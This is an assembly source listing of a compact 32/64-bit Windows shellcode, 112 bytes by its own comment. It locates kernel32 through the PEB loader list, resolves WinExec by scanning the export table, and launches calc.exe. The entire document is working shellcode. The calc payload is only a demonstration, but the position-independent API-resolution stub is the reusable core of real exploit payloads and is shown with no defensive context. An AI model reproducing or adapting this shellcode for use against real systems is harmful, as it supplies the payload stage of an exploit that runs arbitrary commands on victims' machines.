

;
; 112 bytes
;
    bits   32

exec:
    xor    ecx, ecx          ; ecx = 0
    ; -------------
    push   ecx               ; NULL
    push   'calc'            ; calc.exe
    push   esp
    pop    ebp
    ; ------------
    mul    ecx               ; eax = 0, edx = 0
    push   ecx
    pop    ebx 
    mov    bl, 10h           ; edx = 10h
    mov    cl, 18h           ; ecx = 18h
    mov    dl, 30h    
    dec    eax               ; 
    jns    exe_l0
    
    push   ebp
    ; we're 32-bit
    mov    bl, 0ch
    db     64h               ; fs:
    mov    esi, [edx]        ; peb = __readfsdword(0x30)
    jmp    exe_l1
exe_l0:
    db     65h               ; gs:
    dec    eax
    mov    esi, [edx+edx]    ; peb = __readgsqword(0x60)
exe_l1:    
    dec    eax
    mov    esi, [esi+ebx]    ; esi = peb->Ldr
    cmovns ebx, ecx          ; ebx = 10h
exe_l2:    
    dec    eax
    mov    esi, [esi+ebx]    ; 0ch or 10h
    cmovns ecx, edx
exe_l3:    
    dec    eax
    lodsd
    push   eax
    pop    edi
    
    dec    eax
    mov    edi, [edi]

    dec    eax
    mov    ebx, [edi+ecx]
    
    ; add IMAGE_DOS_HEADER.e_lfanew
    dec    eax
    add    edx, [ebx+3ch]
    
    ; edx = export directory
    dec    eax
    mov    edx, [ebx+edx+78h]
    
    ; esi = offset to AddressOfFunctions
    dec    eax
    lea    esi, [ebx+edx+1ch]
    mov    cl, 3
exe_l4:    
    lodsd
    xchg   eax, edx
    dec    eax
    add    edx, ebx
    push   edx
    loop   exe_l4
    
    pop    edi         ; edx = AddressOfNameOrdinals
    pop    esi         ; esi = AddressOfNames 
exe_l5:
    mov    cx, [edi]
    scasw
    lodsd
    cmp    dword [eax+ebx], 'WinE'
    jne    exe_l5
    
    pop    esi         ; esi = AddressOfFunctions
    
    dec    eax
    add    ebx, [esi+4*ecx]
    push   ebp
    pop    ecx         ; calc\0
    cdq
    call   ebx
    
    